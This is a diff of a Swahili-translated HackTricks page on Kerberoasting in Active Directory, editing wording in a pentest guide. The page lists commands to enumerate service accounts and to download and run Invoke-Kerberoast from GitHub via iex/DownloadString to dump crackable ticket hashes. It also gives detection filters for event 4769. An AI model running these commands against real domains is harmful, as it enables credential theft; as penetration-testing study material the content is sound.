@@ -1,9 +1,9 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za **jamii ya juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa kutumia zana za **jamii ya juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -15,7 +15,7 @@ Pata Ufikiaji Leo:
 Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
@@ -24,16 +24,16 @@ Njia nyingine za kusaidia HackTricks:
 
 ## Kerberoast
 
-Kerberoasting inazingatia upatikanaji wa **TGS tickets**, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za mtumiaji** katika **Active Directory (AD)**, zikiondoa **akaunti za kompyuta**. Ufichaji wa tiketi hizi hutumia funguo zinazotokana na **nywila za mtumiaji**, kuruhusu uwezekano wa **kuvunja vibambo nje ya mtandao**. Matumizi ya akaunti ya mtumiaji kama huduma inaonyeshwa na mali ya **"ServicePrincipalName"** isiyokuwa tupu.
+Kerberoast inazingatia upatikanaji wa **TGS tickets**, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za mtumiaji** katika **Active Directory (AD)**, isipokuwa **akaunti za kompyuta**. Ufichaji wa tiketi hizi hutumia funguo zinazotokana na **nywila za mtumiaji**, kuruhusu uwezekano wa **kuvunja vibambo nje ya mtandao**. Matumizi ya akaunti ya mtumiaji kama huduma inaonyeshwa na mali ya **"ServicePrincipalName"** isiyokuwa tupu.
 
-Kwa kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS tickets** ni muhimu; hata hivyo, mchakato huu haudai **mamlaka maalum**, hivyo inapatikana kwa yeyote mwenye **vyeti halali vya kikoa**.
+Kwa kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS tickets** ni muhimu; hata hivyo, mchakato huu hauhitaji **mamlaka maalum**, hivyo inapatikana kwa yeyote mwenye **vyeti halali vya kikoa**.
 
 ### Mambo Muhimu:
 
 * **Kerberoasting** inalenga **TGS tickets** kwa **huduma za akaunti za mtumiaji** ndani ya **AD**.
-* Tiketi zilizofichwa kwa funguo kutoka kwa **nywila za mtumiaji** zinaweza **kuvunjwa nje ya mtandao**.
+* Tiketi zilizofichwa kwa kutumia funguo kutoka **nywila za mtumiaji** zinaweza **kuvunjwa nje ya mtandao**.
 * Huduma inatambuliwa na **ServicePrincipalName** ambayo si tupu.
-* **Hakuna mamlaka maalum** inahitajika, tu **vyeti halali vya kikoa**.
+* **Hakuna mamlaka maalum** inayohitajika, ni **vyeti halali vya kikoa** tu vinavyohitajika.
 
 ### **Shambulio**
 
@@ -60,7 +60,7 @@ adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
 #### Windows
 
-* **Piga orodha ya watumiaji wanaoweza kuroastwa**
+* **Tambua watumiaji wanaoweza kuroast**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
@@ -104,10 +104,10 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Wakati TGS inapoombwa, Windows tukio `4769 - Tiketi ya huduma ya Kerberos ilitakiwa` inazalishwa.
+Wakati TGS inahitajika, tukio la Windows `4769 - Tiketi ya huduma ya Kerberos ilitakiwa` inazalishwa.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** mchakato wa kiotomatiki ulioendeshwa na zana za **jamii** za juu zaidi duniani.\
@@ -129,20 +129,20 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 ```
 Unaweza kupata **zana** muhimu kwa mashambulizi ya **kerberoast** hapa: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Ikiwa unapata **kosa** hili kutoka kwa Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya wakati wako wa ndani, unahitaji kusawazisha mwenyeji na DC. Kuna chaguo kadhaa:
+Ikiwa unapata **kosa** hili kutoka kwa Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya muda wako wa eneo, unahitaji kusawazisha mwenyeji na DC. Kuna chaguzi chache:
 
 * `ntpdate <IP ya DC>` - Imepitwa na wakati kuanzia Ubuntu 16.04
 * `rdate -n <IP ya DC>`
 
 ### Kupunguza Hatari
 
-Kerberoasting inaweza kufanywa kwa kiwango kikubwa cha kificho ikiwa inaweza kutumika. Ili kugundua shughuli hii, tahadhari inapaswa kulipwa kwa **Tukio la Usalama ID 4769**, ambayo inaonyesha kuwa tiketi ya Kerberos imeombwa. Walakini, kutokana na mara kubwa ya tukio hili, vichujio maalum lazima viweke ili kuisolate shughuli za shaka:
+Kerberoasting inaweza kufanywa kwa kiwango kikubwa cha ujasusi ikiwa inaweza kuchexploit. Ili kugundua shughuli hii, tahadhari inapaswa kulipwa kwa **Tukio la Usalama ID 4769**, ambayo inaonyesha kuwa tiketi ya Kerberos imeombwa. Walakini, kutokana na mara kubwa ya tukio hili, vichujio maalum lazima viwekezwe ili kuisolate shughuli za shaka:
 
-* Jina la huduma isiwe **krbtgt**, kwani hii ni ombi la kawaida.
+* Jina la huduma isitakuwa **krbtgt**, kwani hii ni ombi la kawaida.
 * Majina ya huduma yanayoishia na **$** yanapaswa kuepukwa ili kuepuka kujumuisha akaunti za mashine zinazotumiwa kwa huduma.
 * Maombi kutoka kwa mashine yanapaswa kufutwa kwa kuepuka majina ya akaunti yaliyoandikwa kama **machine@domain**.
-* Ombi la tiketi lililofanikiwa pekee linapaswa kuzingatiwa, likitambuliwa na msimbo wa kushindwa wa **'0x0'**.
-* **Muhimu zaidi**, aina ya kuchakata tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
+* Ombi la tiketi lililofanikiwa pekee linapaswa kuzingatiwa, likitambuliwa na nambari ya kushindwa ya **'0x0'**.
+* **Muhimu zaidi**, aina ya kuchapisha tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
@@ -157,7 +157,7 @@ Kwa kutekeleza hatua hizi, mashirika yanaweza kupunguza kwa kiasi kikubwa hatari
 
 Mnamo **Septemba 2022**, njia mpya ya kutumia mfumo ilifunuliwa na mtafiti aliyeitwa Charlie Clark, aliyeshiriki kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Mbinu hii inaruhusu kupata **Tiketi za Huduma (ST)** kupitia ombi la **KRB\_AS\_REQ**, ambalo kwa kiasi kikubwa halihitaji udhibiti wowote juu ya akaunti yoyote ya Active Directory. Kimsingi, ikiwa mwakilishi amewekwa kwa njia ambayo haitahitaji uthibitishaji wa awali - hali inayofanana na inayojulikana katika uwanja wa usalama wa mtandao kama shambulio la **AS-REP Roasting** - sifa hii inaweza kutumika kudanganya mchakato wa ombi. Hasa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyofichwa kawaida (TGT).
 
-Mbinu hii imeelezewa kikamilifu katika makala hii: [Machapisho ya blogi ya Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+Mbinu hii imeelezewa kikamilifu katika makala hii: [Chapisho la blogi ya Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 {% hint style="warning" %}
 Unapaswa kutoa orodha ya watumiaji kwa sababu hatuna akaunti halali ya kuuliza LDAP kutumia mbinu hii.
@@ -195,10 +195,10 @@ Njia nyingine za kusaidia HackTricks:
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za **jamii za hali ya juu zaidi**.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za **jamii za hali ya juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
